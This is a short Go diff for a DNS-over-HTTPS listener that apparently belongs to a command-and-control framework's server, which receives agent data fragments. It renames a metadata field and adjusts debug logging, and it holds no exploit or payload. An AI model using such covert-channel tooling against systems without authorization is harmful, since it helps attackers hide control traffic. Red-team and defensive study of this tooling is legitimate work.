@@ -45,10 +45,10 @@ type dohDownBuf struct {
 const metaV1Size = 8
 
 type metaV1 struct {
-	Version   byte
-	MetaFlags byte
-	Reserved  uint16
-	QueryTask uint32
+	Version       byte
+	MetaFlags     byte
+	Reserved      uint16
+	DownAckOffset uint32
 }
 
 func parseMetaV1(data []byte) (metaV1, []byte, bool) {
@@ -59,7 +59,7 @@ func parseMetaV1(data []byte) (metaV1, []byte, bool) {
 	m.Version = data[0]
 	m.MetaFlags = data[1]
 	m.Reserved = binary.LittleEndian.Uint16(data[2:4])
-	m.QueryTask = binary.LittleEndian.Uint32(data[4:8])
+	m.DownAckOffset = binary.LittleEndian.Uint32(data[4:8])
 	return m, data[metaV1Size:], true
 }
 
@@ -193,7 +193,13 @@ func (d *DoHListener) handlePutFragment(sid string, seq int, data []byte) {
 	meta, rest, hasMeta := parseMetaV1(data)
 	if hasMeta {
 		if dohDebug {
-			fmt.Printf("[SRV-UP] META v=%d flags=0x%x qtask=%d sid=%s len=%d\n", meta.Version, meta.MetaFlags, meta.QueryTask, sid, len(data))
+			if (meta.MetaFlags & 0x1) != 0 {
+				fmt.Printf("[SRV-UP] META v=%d flags=0x%x downAckOffset=%d sid=%s len=%d\n",
+					meta.Version, meta.MetaFlags, meta.DownAckOffset, sid, len(data))
+			} else {
+				fmt.Printf("[SRV-UP] META v=%d flags=0x%x sid=%s len=%d\n",
+					meta.Version, meta.MetaFlags, sid, len(data))
+			}
 		}
 		if len(rest) <= 8 {
 			_ = d.ts.TsAgentProcessData(sid, rest)
